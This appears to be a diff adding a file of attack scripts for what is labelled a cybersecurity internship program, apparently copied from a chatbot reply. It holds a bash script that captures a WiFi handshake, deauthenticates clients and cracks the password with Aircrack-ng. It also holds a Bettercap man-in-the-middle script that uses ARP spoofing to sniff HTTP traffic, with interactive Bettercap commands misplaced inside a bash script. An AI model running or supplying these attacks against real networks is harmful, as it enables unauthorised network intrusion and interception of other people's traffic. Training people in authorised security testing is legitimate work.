@@ -1,0 +1,43 @@
+
+Here are the programs and scripts related to your tasks in the CFSS Cybersecurity Paid Internship Program:
+
+Project 1: Exploring WiFi Security
+WiFi Hacking Techniques (using Aircrack-ng for Password Cracking)
+To crack WiFi passwords using Aircrack-ng, here is a script that demonstrates password cracking on a captured handshake file.
+
+bash
+Copy code
+#!/bin/bash
+# WiFi password cracking script using Aircrack-ng
+
+# Capture a handshake
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon --bssid [AP BSSID] -c [Channel] -w capture
+
+# Deauthenticate to capture handshake
+sudo aireplay-ng --deauth 10 -a [AP BSSID] wlan0mon
+
+# Crack the password with a wordlist
+sudo aircrack-ng -w /path/to/wordlist.txt -b [AP BSSID] capture*.cap
+Note: Replace [AP BSSID], [Channel], and /path/to/wordlist.txt with actual values.
+
+Project 2: MITM Attack Exploration with Bettercap
+Performing MITM Attack Using Bettercap
+Here's a script to perform a basic MITM attack using Bettercap to capture HTTP packets.
+
+bash
+Copy code
+#!/bin/bash
+# MITM attack using Bettercap
+
+# Start Bettercap and enable packet forwarding
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo bettercap -caplet http-req-dump
+
+# Enable ARP Spoofing (replace target IP and router IP with actual values)
+set arp.spoof.targets [TARGET_IP]
+set arp.spoof.fullduplex true
+arp.spoof on
+
+# Intercept traffic
+net.sniff on
